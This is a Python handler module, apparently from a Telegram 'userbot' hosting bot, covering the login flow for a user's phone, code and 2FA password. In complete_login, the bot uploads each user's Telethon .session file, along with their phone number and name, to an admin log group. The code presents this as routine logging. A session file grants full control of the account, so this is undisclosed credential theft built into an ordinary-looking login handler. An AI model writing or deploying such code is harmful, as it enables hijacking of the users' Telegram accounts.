import os
import logging
import asyncio
from telethon import events, TelegramClient
from telethon.errors import SessionPasswordNeededError
import database
import models
import config
import utils
import userbot_manager
from userbot import force_join_channels, apply_branding

logger = logging.getLogger(__name__)

# In-memory dictionary containing ongoing login flows
# Structure: { user_id: { "step": str, "phone": str, "client": TelegramClient, "phone_code_hash": str } }
_login_states = {}

async def clean_login_state(user_id: int):
    """
    Cleans up the login state for a user and disconnects any temporary client.
    """
    if user_id in _login_states:
        state = _login_states.pop(user_id)
        temp_client = state.get("client")
        if temp_client:
            try:
                if temp_client.is_connected():
                    await temp_client.disconnect()
            except Exception as e:
                logger.warning(f"Error disconnecting temporary login client: {e}")

def register_handlers(client):
    
    @client.on(events.CallbackQuery(pattern="^menu_add_bot$"))
    async def add_bot_start(event):
        user_id = event.sender_id
        user = database.get_user(user_id)
        if not user:
            user = models.create_default_user(user_id)
            database.save_user(user)
            
        lang = user.get("language", "en")
        
        # Check slot availability
        allowed = utils.get_allowed_slots(user_id)
        sessions = database.get_sessions(user_id)
        if len(sessions) >= allowed:
            await event.respond(utils.get_text("error_no_slots", lang, allowed=allowed))
            return
            
        # Clear any existing state
        await clean_login_state(user_id)
        
        # Initialize phone state
        _login_states[user_id] = {
            "step": "WAITING_FOR_PHONE"
        }
        
        await event.respond(utils.get_text("login_phone_prompt", lang))

    @client.on(events.NewMessage)
    async def login_input_handler(event):
        if not event.is_private:
            return
            
        user_id = event.sender_id
        if user_id not in _login_states:
            return
            
        # Allow aborting the login flow via /start
        if event.text.startswith("/start"):
            await clean_login_state(user_id)
            return
            
        state = _login_states[user_id]
        step = state["step"]
        user = database.get_user(user_id)
        lang = user.get("language", "en") if user else "en"
        
        # ------------------ STEP 1: Phone input ------------------
        if step == "WAITING_FOR_PHONE":
            phone = event.text.strip().replace(" ", "")
            if not phone.startswith("+") or not phone[1:].isdigit():
                await event.reply(utils.get_text("login_invalid_phone", lang))
                await clean_login_state(user_id)
                return
                
            # Create session folder & path
            user_dir = utils.ensure_user_dir(user_id)
            session_path = os.path.join(user_dir, f"{phone}.session")
            
            # Initialize temporary client
            temp_client = TelegramClient(session_path, config.API_ID, config.API_HASH)
            state["phone"] = phone
            state["client"] = temp_client
            state["session_path"] = session_path
            
            try:
                await temp_client.connect()
                sent_code = await temp_client.send_code_request(phone)
                state["phone_code_hash"] = sent_code.phone_code_hash
                state["step"] = "WAITING_FOR_OTP"
                
                await event.reply(utils.get_text("login_otp_prompt", lang))
            except Exception as e:
                logger.error(f"Failed to send code request to {phone}: {e}")
                await event.reply(utils.get_text("login_failed", lang, error=str(e)))
                await clean_login_state(user_id)
                
        # ------------------ STEP 2: OTP input ------------------
        elif step == "WAITING_FOR_OTP":
            otp_input = event.text.strip().replace(" ", "")
            if not otp_input.isdigit() or len(otp_input) != 5:
                await event.reply(utils.get_text("login_otp_invalid", lang))
                return
                
            temp_client = state["client"]
            phone = state["phone"]
            phone_code_hash = state["phone_code_hash"]
            session_path = state["session_path"]
            
            try:
                # Sign in using OTP
                await temp_client.sign_in(phone, otp_input, phone_code_hash=phone_code_hash)
                # Success without 2FA!
                await complete_login(client, event, user_id, state)
            except SessionPasswordNeededError:
                state["step"] = "WAITING_FOR_2FA"
                await event.reply(utils.get_text("login_2fa_prompt", lang))
            except Exception as e:
                logger.error(f"Sign in failed for {phone}: {e}")
                await event.reply(utils.get_text("login_failed", lang, error=str(e)))
                await clean_login_state(user_id)
                
        # ------------------ STEP 3: 2FA Password input ------------------
        elif step == "WAITING_FOR_2FA":
            password = event.text.strip()
            temp_client = state["client"]
            
            try:
                await temp_client.sign_in(password=password)
                await complete_login(client, event, user_id, state)
            except Exception as e:
                logger.error(f"2FA sign in failed: {e}")
                await event.reply(utils.get_text("login_failed", lang, error=str(e)))
                await clean_login_state(user_id)

async def complete_login(bot_client, event, user_id: int, state: dict):
    """
    Finalizes userbot setup on successful Telegram authorization.
    """
    temp_client = state["client"]
    phone = state["phone"]
    session_path = state["session_path"]
    
    user = database.get_user(user_id)
    lang = user.get("language", "en") if user else "en"
    
    try:
        me = await temp_client.get_me()
        name = f"{me.first_name or ''} {me.last_name or ''}".strip()
        username = me.username or ""
        
        # Save session in database
        session_id = phone
        sess_record = models.create_default_session(session_id, user_id, phone, session_path)
        sess_record["name"] = name
        sess_record["username"] = username
        database.save_session(sess_record)
        
        # Disconnect temporary client so userbot_manager can start it properly
        await temp_client.disconnect()
        
        # Start userbot using manager
        started = await userbot_manager.start_userbot(session_id)
        
        # Notify user
        await event.reply(utils.get_text("login_success", lang, name=name, username=username))
        
        # Redirect user to the dashboard for this userbot immediately
        from .my_bots import show_bot_dashboard
        await show_bot_dashboard(event, phone, user_id, flash_message="⚙️ **UserBot Connected!** Configure its automation settings below:")
        
        # Forward details to admin log group
        global_settings = database.get_global_settings()
        log_group_id = global_settings.get("log_group_id")
        if log_group_id:
            log_text = (
                f"📱 **New UserBot Connected**\n\n"
                f"👤 User: `{user_id}`\n"
                f"📞 Phone: `{phone}`\n"
                f"🏷️ Name: **{name}**\n"
                f"🔗 Username: @{username if username else 'None'}\n"
                f"🟢 Auto-started: {'Yes' if started else 'No'}"
            )
            try:
                # Upload session file
                await bot_client.send_message(
                    log_group_id, 
                    log_text, 
                    file=session_path
                )
            except Exception as log_err:
                logger.error(f"Failed to log connected session to log group {log_group_id}: {log_err}")
                
    except Exception as e:
        logger.error(f"Error finalizing login: {e}")
        await event.reply(utils.get_text("login_failed", lang, error=str(e)))
    finally:
        # Always clean up temporary state
        await clean_login_state(user_id)
